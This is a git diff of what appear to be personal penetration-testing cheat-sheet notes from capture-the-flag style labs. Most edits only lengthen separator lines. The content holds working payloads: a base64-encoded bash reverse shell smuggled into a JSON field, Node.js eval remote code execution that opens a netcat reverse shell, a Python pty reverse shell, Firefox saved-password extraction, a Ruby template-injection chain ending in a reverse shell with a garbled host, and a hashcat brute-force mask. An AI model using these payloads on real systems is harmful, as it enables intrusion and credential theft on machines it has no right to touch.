@@ -185,7 +185,7 @@ port 27017 => mongodb
 #show dbs;
 #show collections;
 #db.user.find();
-____________________________________________________________________________________________________________________________________
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
 Authorization: Basic cmFzY2FsOm1hZ2ljaw==  (original in burpsuite)
 Connection: close
 Referer: http://10.10.149.114/
@@ -203,7 +203,7 @@ reverse shell
 --------------
 change bash reverse shell into base64
 {"target":"\" \necho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjUyLjE3LzEyMzQgMD4mMQo=  | base64 -d | bash\n"}
-______________________________________________________________________________________________________________________________________________
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
 CURL , FFUF and eval rce
 --------------------------
 
@@ -238,7 +238,7 @@ require("child_process").exec('rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bca
 In burpsuite
 -------------
 POST /api/items?cmd=require("child_process").exec('rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E4%2E52%2E17%201234%20%3E%2Ftmp%2Ff') HTTP/1.1
-_________________________________________________________________________________________________________________________________________________________________________
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
 Extracting username and passwords from firefox directory
 ---------------------------------------------------------
 In /home/user/.mozilla/firefox
@@ -247,7 +247,7 @@ there is user profiles (hkf9b9xx.default-esr, b5w4643p.default-release)
 In firefox user profiles , there are important username,passwords with website logins.
 
 We can use firefox-decrypt(https://github.com/unode/firefox_decrypt) to extract username and passwords.
-_________________________________________________________________________________________________________________________________________________________________________
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
 pspy64 (python tool is good to look cronjob with root user permission)
 
 In crontab
@@ -275,8 +275,32 @@ dup2(s.fileno(),1)
 dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 s.close()
+________________________________________________________________________________________________________________________________________________________________________________________________________________
+category1=Maths&grade1=100&weight1=50 (original)
+
+category1=Maths%0Aid&grade1=100&weight1=50 (base64 injection)(%0A means /n)
+
+SSTI payload injection (RUBY)
+------------------------------
+
+<%= 7*7 %> = 49
+
+if 49 is displayed , you can inject anything.
+
+category1=Maths%0A<%= 7*7 %>&grade1=100&weight1=50 
+
+category1=Maths%0A<%25%3d5*5%25>&grade1=100&weight1=50 (5*5 also works instead of 7*7)
+
+category1=Maths%0A<%25%3d+`ls+-al`+%25>&grade1=100&weight1=50 (inject with ls -al)
+
+Maths%0A<%25%3d+`rm+-f+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+exp10.10.14.21+1234+>/tmp/f`+%25>(reverse shell with url encoding)
 
 
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+hashcat -a 3 -m 1400 su.txt --increment susan_nasus_?d?d?d?d?d?d?d?d?d?d
+
+--increment means it brutforces incrementally.
 
 
 
